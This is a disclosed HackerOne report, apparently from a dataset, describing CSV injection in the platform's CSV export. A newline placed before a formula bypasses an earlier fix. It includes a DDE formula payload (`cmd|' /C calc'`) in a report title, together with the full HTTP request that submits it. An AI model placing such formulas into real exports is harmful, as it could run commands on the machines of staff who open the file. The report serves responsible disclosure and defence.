---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '111192'
original_report_id: '111192'
title: CSV Injection via the CSV export feature
weakness: Command Injection - Generic
team_handle: security
created_at: '2016-01-17T02:40:14.305Z'
disclosed_at: '2016-02-16T21:45:20.849Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- command-injection-generic
---

# CSV Injection via the CSV export feature

## Metadata

- HackerOne Report ID: 111192
- Weakness: Command Injection - Generic
- Program: security
- Disclosed At: 2016-02-16T21:45:20.849Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi , I have managed to bypass your fix for #72785 by submitting a report with *NewLine* character (0x0a) in the title before the CSV formula.
#Steps to reproduce: 
1. As a researcher , Submit a report to a program with the title `%0A-2+3+cmd|' /C calc'!D2` , here is an example request: 

```
POST https://hackerone.com/security/reports/ HTTP/1.1
accept: application/json, text/javascript, */*; q=0.01
accept-encoding: gzip, deflate
accept-language: ar,en-US;q=0.8,en;q=0.6
content-length: 165
content-type: application/x-www-form-urlencoded; charset=UTF-8
cookie: <Your_session_cookies>
origin: https://hackerone.com
referer: https://hackerone.com/
user-agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36
x-csrf-token: <your_token>
x-requested-with: XMLHttpRequest
Host: hackerone.com

report%5Btitle%5D=%0A-2%2B3%2Bcmd%7C'+%2FC+calc'!D2&report%5Bvulnerability_information%5D=test&report%5Bvulnerability_type_ids%5D%5B%5D=85553&report%5Bforce%5D=false
```
2. As a response team, Go to **Reports** page then export the report as CSV.
3. open the CSV file and you'll see that the cell is active.

Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
